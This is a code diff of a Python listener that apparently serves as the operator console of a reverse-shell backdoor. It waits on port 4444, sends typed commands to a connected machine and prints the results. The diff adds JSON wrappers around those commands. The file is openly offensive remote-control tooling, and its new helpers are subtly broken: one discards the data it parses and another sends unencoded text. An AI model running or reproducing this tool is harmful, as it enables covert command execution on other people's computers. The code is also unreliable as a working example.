@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import socket
+import json
 
 class Listener:
     def __init__(self, ip, port):
@@ -14,10 +15,19 @@ class Listener:
         self.connection, address = listener.accept()
         print("[+] Connection established with " + str(address))
 
+    def send_json(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def receive_json(self):
+        json_data = self.connection.recv(1024)
+        json.loads(json_data)
 
     def execute_remotely(self, command):
-        self.connection.send(command)
-        return self.connection.recv(2048).decode()
+        # self.connection.send(command)
+        # return self.connection.recv(2048).decode()
+        self.send_json(command)
+        return self.receive_json()
 
     def run(self):
         while True:
@@ -25,5 +35,7 @@ class Listener:
             result = self.execute_remotely(command)
             print(result)
 
-my_Listener = Listener("10.0.2.4", 4444)
+ip = "10.0.2.4"
+port = 4444
+my_Listener = Listener(ip, port)
 my_Listener.run()
